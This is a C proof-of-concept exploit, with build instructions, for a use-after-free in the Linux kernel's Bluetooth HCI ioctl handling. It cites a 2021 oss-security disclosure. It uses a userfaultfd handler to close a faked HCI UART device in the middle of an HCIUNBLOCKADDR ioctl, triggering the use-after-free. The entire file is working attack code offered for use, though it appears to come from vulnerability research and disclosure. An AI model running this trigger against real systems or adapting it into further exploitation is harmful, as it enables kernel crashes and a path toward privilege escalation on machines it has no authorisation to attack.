// https://www.openwall.com/lists/oss-security/2021/06/08/2
// https://www.anquanke.com/post/id/248545
// gcc poc.c ptmx_sim.c -o poc -lpthread -static
// - ptmx_sim.h: header file for some utils
// - ptmx_sim.c: utils to fake a HCI controller
// - exp.c: adopts the userfaultfd to cause UAF
// CONFIG_BT_HCIUART, CONFIG_BT_HCIUART_H4 are NEEDED!
/* Header */
#include <sys/xattr.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/userfaultfd.h>
#include <sys/types.h>
#include <stdio.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <poll.h>
#include <stdint.h>

#include "ptmx_sim.h"

#define HCIUNBLOCKADDR	_IOW('H', 231, int)
#define HCIBLOCKADDR	_IOW('H', 230, int)
#define HCIGETCONNINFO	_IOR('H', 213, int)
#define HCIGETAUTHINFO	_IOR('H', 215, int)
#define DEFAULT_HDEV    0

#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
                       } while (0)

static int page_size;
int fd;
int procfd;

struct pparam p = {0};

static void *
fault_handler_thread(void *arg)
{
    static struct uffd_msg msg;   /* Data read from userfaultfd */
    static int fault_cnt = 0;     /* Number of faults so far handled */
    long uffd;                    /* userfaultfd file descriptor */
    static char *page = NULL;
    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) arg;

    /* Create a page that will be copied into the faulting region */

    if (page == NULL) {
        page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (page == MAP_FAILED)
            errExit("mmap");
    }

    /* Loop, handling incoming events on the userfaultfd
      file descriptor */

    for (;;) {

        /* See what poll() tells us about the userfaultfd */

        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);
        if (nready == -1)
            errExit("poll");

        /* Read an event from the userfaultfd */

        nread = read(uffd, &msg, sizeof(msg));
        if (nread == 0) {
            printf("EOF on userfaultfd!\n");
            exit(EXIT_FAILURE);
        }

        if (nread == -1)
            errExit("read");

        /* We expect only one kind of event; verify that assumption */

        if (msg.event != UFFD_EVENT_PAGEFAULT) {
            fprintf(stderr, "Unexpected event on userfaultfd\n");
            exit(EXIT_FAILURE);
        }

        /* Copy the page pointed to by 'page' into the faulting
           region. Vary the contents that are copied in, so that it
           is more obvious that each fault is handled separately. */

        if (msg.arg.pagefault.flags & UFFD_PAGEFAULT_FLAG_WRITE) {
            printf("[*] write fault\n");

            // we don't expect write fault

            struct uffdio_range range;
            range.start = msg.arg.pagefault.address & ~(page_size - 1);
            range.len = page_size;
            if (ioctl(uffd, UFFDIO_UNREGISTER, &range) == -1)
                errExit("ioctl-UFFDIO_UNREGISTER");
            if (ioctl(uffd, UFFDIO_WAKE, &range) == -1)
                errExit("ioctl-UFFDIO_WAKE");
        } else {
            printf("[*] read fault\n");

            // that's we want, let's close the device here
            close(p.mfd);

            // we wait a while to ensure the close is done?
            usleep(250);

            *(unsigned long int *)page = 0;
            fault_cnt++;

            uffdio_copy.src = (unsigned long) page;

            uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                                ~(page_size - 1);
            uffdio_copy.len = page_size;
            uffdio_copy.mode = 0;
            uffdio_copy.copy = 0;
            if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
                errExit("ioctl-UFFDIO_COPY");
        }
    }
}

int main() {

    // 1. Setup userfaultfd

    long uffd;          /* userfaultfd file descriptor */
    char *addr;         /* Start of region handled by userfaultfd */
    unsigned long len;  /* Length of region handled by userfaultfd */
    pthread_t thr;      /* ID of thread that handles page faults */
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;

    page_size = sysconf(_SC_PAGE_SIZE);
    len = 1 * page_size;

    /* Create and enable userfaultfd object */

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
       errExit("userfaultfd");

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
       errExit("ioctl-UFFDIO_API");

    /* Create a private anonymous mapping. The memory will be
      demand-zero paged--that is, not yet allocated. When we
      actually touch the memory, it will be allocated via
      the userfaultfd. */

    addr = mmap(NULL, len, PROT_READ | PROT_WRITE,
               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (addr == MAP_FAILED)
       errExit("mmap");

    /* Register the memory range of the mapping we just created for
      handling by the userfaultfd object. In mode, we request to track
      missing pages (i.e., pages that have not yet been faulted in). */

    uffdio_register.range.start = (unsigned long) addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
       errExit("ioctl-UFFDIO_REGISTER");

    /* Create a thread that will process the userfaultfd events */

    s = pthread_create(&thr, NULL, fault_handler_thread, (void *) uffd);
    if (s != 0) {
       errno = s;
       errExit("pthread_create");
    }

    // 2. Begin exploit
    /*
     * We need to first initialize our HCI device and wake it up.
     * After these, we have to create socket, bind it and call ioctl
     * with the prepared address
     */

    p = initialize_hci_uart(); // CAP_NET_ADMIN

    struct sockaddr_hci hci_addr = {0};
    hci_addr.hci_family = AF_BLUETOOTH;
    hci_addr.hci_dev = DEFAULT_HDEV; // we should be 0 device
    if (bind(p.sock, (struct sockaddr *)&hci_addr, sizeof(hci_addr)) < 0) {
        errExit("socket bind");
    }

    // try to do some ioctl with the userfaultfd address
    /* HCIUNBLOCKADDR */
    if (ioctl(p.sock, HCIUNBLOCKADDR, addr) < 0) {
        perror("HCIUNBLOCKADDR ioctl");
        // we don't have to leave
    }

    /* HCIBLOCKADDR */
    // if (ioctl(p.sock, HCIBLOCKADDR, addr) < 0) {
    // 	perror("HCIBLOCKADDR ioctl");
    // }

    /* HCIGETCONNINFO */
    // if (ioctl(p.sock, HCIGETCONNINFO, addr) < 0) {
    // 	perror("HCIGETCONNINFO ioctl");
    // }

    /* HCIGETAUTHINFO */
    // if (ioctl(p.sock, HCIGETAUTHINFO, addr) < 0) {
    // 	perror("HCIGETAUTHINFO ioctl");
    // }

    return 0;
}
